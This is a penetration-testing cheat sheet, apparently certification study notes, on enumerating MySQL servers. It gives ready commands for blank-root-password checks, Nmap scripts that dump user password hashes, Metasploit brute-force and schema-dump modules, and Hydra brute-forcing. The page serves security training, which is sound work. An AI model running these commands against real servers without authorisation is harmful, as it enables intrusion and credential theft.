---
title: "MySQL enumeration"
description: "Version fingerprinting, schema dumping, and brute-forcing MySQL servers."
pubDate: 2026-08-01
category: "Cybersecurity"
source: "INE Certification"
lang: "sql"
tags: ["mysql", "sql", "enumeration", "nmap", "metasploit", "hydra"]
draft: false
---

MySQL enumeration is mostly about the `root` account. It's frequently the only user that exists, and it's frequently reachable with an empty password (especially in test/lab environments), so check that before reaching for a full brute-force. Default port is `3306`.

## MySQL client

```bash
mysql -h <target_ip> -u root          # try root with no/blank password first
```

```sql
show databases;
use <database_name>;
select count(*) from <table_name>;
```

## Nmap

```bash
nmap --script=mysql-empty-password -p3306 <target_ip>            # check for empty root/anon password
nmap --script=mysql-info -p3306 <target_ip>
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p3306 <target_ip>
nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p3306 <target_ip>
nmap --script=mysql-dump-hashes --script-args="username='root',password=''" -p3306 <target_ip>
nmap --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''" -p3306 <target_ip>
```

## Metasploit

```text
auxiliary/scanner/mysql/mysql_version
auxiliary/scanner/mysql/mysql_login          # brute-force
auxiliary/scanner/mysql/mysql_schemadump     # dump entire schema
auxiliary/scanner/mysql/mysql_hashdump       # list users + password hashes
auxiliary/scanner/mysql/mysql_writable_dirs
auxiliary/scanner/mysql/mysql_file_enum
admin/mysql/mysql_sql                        # run an arbitrary SQL query with valid creds
```

## Brute-force

```bash
hydra -l root -P passwords.txt <target_ip> mysql
```

## Related

- [Nmap](/snippets/cybersecurity/tools/scanning-enumeration-tools/nmap): NSE scripts and scan options
- [Metasploit Framework](/snippets/cybersecurity/tools/exploitation-frameworks/metasploit-framework): running the auxiliary modules
- [Hydra](/snippets/cybersecurity/tools/credential-attack-tools/hydra): brute-forcing logins across protocols
- [Hashcat](/snippets/cybersecurity/tools/credential-attack-tools/hashcat): cracking hashes pulled with `mysql-dump-hashes`
